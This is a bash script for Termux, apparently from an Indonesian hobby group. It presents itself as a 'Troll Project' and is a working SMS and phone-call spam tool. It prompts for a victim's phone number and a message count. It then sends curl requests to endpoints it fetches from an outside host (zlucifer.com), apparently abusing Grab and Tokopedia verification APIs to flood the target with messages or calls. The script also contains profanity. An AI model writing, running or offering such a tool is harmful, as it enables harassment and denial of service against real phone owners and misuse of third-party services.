#!/data/data/com.termux/files/usr/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                                   ________________________
< Dyan Destian Rama Dani >
 ------------------------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
          _                            _  ___
__  __   / \   _ __   ___  _ __  _   _/ |( _ )
\ \/ /  / _ \ | '_ \ / _ \| '_ \| | | | |/ _ \
 >  <  / ___ \| | | | (_) | | | | |_| | | (_) |
/_/\_\/_/   \_\_| |_|\___/|_| |_|\__, |_|\___/
                                 |___/                                        ////
#////                                                                           ////
#////                                                                            ////
#////                                                                              ////
#////                                                                            ////
#////                                                                          ////
#////                                                                        ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERINGATAN : Seng Gae Arek FGS (Falcons Squad Gamer) MR.R4M4 D4N1
#TOOLS ku Ojo di Gawe Dolanan Jancok Bangsat sng Gawe Bangsat:)
troll(){
    clear
    sleep 0.03
    echo "         _ "
    sleep 0.03
    echo "        /_)  _.-===-._ "
    sleep 0.03
    echo "       /  .; '_-.'- .'.     _ "
    sleep 0.03
    echo "  __ _/  /.'\ ._  '. , \   (_\ "
    sleep 0.03
    echo " /\_( \  |.'.-._'- .  '|     \ "
    sleep 0.03
    echo " |_)  /  |/'    ''--''\|     _\__ "
    sleep 0.03
    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
    sleep 0.03
    echo " )/  (  \_      _      _/   \' (_| "
    sleep 0.03
    echo " /   /    \           /     _) (_/ "
    sleep 0.03
    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
    sleep 0.03
    echo " \    /  \ \  '''''  / / /     /   \ "
    sleep 0.03
    echo "  \_.'    \ \       / /  |   .' "
    sleep 0.03
    echo "   '--.,   \ \     / /  _;-'' "
    sleep 0.03
    echo "       '|   \ \   / /   | "
    sleep 0.03
    echo "       .;----'''''''----;. "
    sleep 0.03
    echo "      /(                 )\ "
    sleep 0.03
    echo "      \_''-------------''_/ "
    sleep 0.03
    echo "      | '';-----;-----;'' | "
    sleep 0.03
    echo "      | / : \ / : \ / : \ | "
    sleep 0.03
    echo "      |V.','.V.','.V.','.V| "
    sleep 0.03
    echo "      \'./_\.;./_\.;./_\.'/ "
    sleep 0.03
    echo "       ';..___________..;' "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo " ==      Troll Project      =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "Gunakan Troll Project Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Matur Suwun wes  Gawe Troll project"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Close Troll Project"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Troll Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081615788876
            read target # masukin no telp COK
            echo
            echo "Piro sms seng arepe dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "ojo ditutup disek COK aplikasi sak Urunge spam Wes Mari"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo " FGS ( Falcons Squad Gamer ) "
                    echo " R4M4 D4N1"
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081615788876
            read target # masukin no telp COK
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "ojo ditutup disek COK aplikasi sak Urunge spam Wes Mari"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo " FGS ( Falcons Squad Gamer ) "
                  echo " R4M4 D4N1"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Matur Suwun wes  Gawe Troll project"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Nomer Yg Anda Telpon Telah Tidak ada Pulsa.."
load
clear
troll
echo Selamat datang Cok, Sopo Jenengmu COK? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai troll project?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
